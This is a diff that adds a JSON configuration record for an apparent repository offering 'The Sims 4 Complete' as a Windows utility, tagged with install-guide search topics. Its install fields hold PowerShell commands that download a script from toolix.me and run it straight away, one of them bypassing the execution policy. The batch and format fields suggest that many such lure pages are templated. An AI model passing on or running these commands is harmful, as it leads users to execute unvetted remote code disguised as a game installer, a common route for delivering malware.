@@ -1,0 +1,25 @@
+{
+  "repo": "the-sims-4-complete",
+  "product": "The Sims 4 Complete",
+  "product_title": "the",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-part1",
+  "format": "license-md-toolix-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "sims-4",
+    "sims-4-4",
+    "how-to-install-sims-4",
+    "how-to-setup-sims-4",
+    "desktop-package",
+    "windows-11",
+    "windows-10",
+    "the-sims",
+    "the-sims-4"
+  ],
+  "site": "toolix.me"
+}
